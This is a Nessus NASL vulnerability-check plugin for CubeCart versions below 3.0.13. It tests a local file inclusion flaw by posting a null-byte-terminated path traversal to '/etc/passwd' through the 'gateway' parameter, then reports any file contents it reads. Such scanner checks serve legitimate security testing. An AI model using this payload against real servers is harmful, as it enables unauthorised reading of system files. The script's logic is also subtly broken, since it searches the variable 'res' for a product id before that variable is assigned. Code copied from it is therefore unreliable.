#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(22296);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2006-4525", "CVE-2006-4526", "CVE-2006-4527");
  script_bugtraq_id(19782);
  script_xref(name:"OSVDB", value:"28280");
  script_xref(name:"OSVDB", value:"28281");
  script_xref(name:"OSVDB", value:"28279");

  script_name(english:"CubeCart < 3.0.13 Multiple Remote Vulnerabilities (LFI, SQLi, XSS)");
  script_summary(english:"Tries to read a local file in CubeCart");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that suffers from
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The version of CubeCart installed on the remote host fails to properly
sanitize user-supplied input to the 'gateway' parameter before using
it in the 'includes/content/gateway.inc.php' script to include PHP
code.  An unauthenticated remote attacker may be able to exploit this
issue to view arbitrary files or to execute arbitrary PHP code on the
remote host, subject to the privileges of the web server user id. 

In addition, the application fails to initialize the 'searchArray' and
'links' array variables, which could be leveraged to launch SQL
injection and cross-site scripting attacks respectively against the
affected installation as long as PHP's 'register_globals' setting is
enabled." );
 script_set_attribute(attribute:"see_also", value:"http://www.gulftech.org/?node=research&article_id=00111-08282006&" );
 script_set_attribute(attribute:"see_also", value:"http://www.cubecart.com/site/forums/index.php?showtopic=21540" );
 script_set_attribute(attribute:"solution", value:
"Either apply the patches referenced in the vendor advisory above or
upgrade to CubeCart version 3.0.13 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("cubecart_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/cubecart"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (isnull(matches)) exit(0);

dir = matches[2];
init_cookiejar();
# Grab index.php to get a session cookie
r = http_send_recv3(method: 'GET', item:string(dir, "/index.php"), port:port);
if (isnull(r)) exit(0);

# Extract the session cookie as well as a product id.
# k = get_http_cookie_key(name_re: "^ccSID-.+$");
# if (isnull(k)) exit(0);

  pat = '\\?act=viewProd&amp;productId=([^"]+)"';
  id = NULL;
  matches = egrep(pattern:pat, string:res);
  if (matches) {
    foreach match (split(matches)) {
      match = chomp(match);
      id = eregmatch(pattern:pat, string:match);
      if (!isnull(id)) {
        id = id[1];
        break;
      }
    }
  }

if (! id) exit(0);

# If we have a session cookie and product id...
# Place an order.
r = http_send_recv3(method: 'POST', data: "add=1", version: 11, port: port,
  item: strcat(dir, "/index.php?act=viewProd&productId=", id),
  add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
if (isnull(r)) exit(0);

# Now try to exploit the flaw to read a file.
file = "../../../../../../../../../../etc/passwd";
r = http_send_recv3(method: 'POST', data: strcat("gateway=", file, "%00"),
  version: 11, item: strcat(dir, "/cart.php?act=step5"), port: port,
  add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
if (isnull(r)) exit(0);
res = r[2];

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or...
      string("main(modules/gateway/", file, "\\0/transfer.inc.php): failed to open stream") >< res ||
      # we get an error claiming the file doesn't exist or...
      string("main(modules/gateway/", file, "): failed to open stream: No such file") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(./modules/gateway/", file) >< res
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      {
        contents = res - strstr(res, "An error");
        if (contents) contents = contents - strstr(contents, "<b");
      }

      if (contents && report_verbosity)
        report = string(
          "Here are the contents of the file '/etc/passwd' that Nessus\n",
          "was able to read from the remote host :\n",
          "\n",
          contents
        );
      else report = NULL;

      security_hole(port:port, extra:report);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
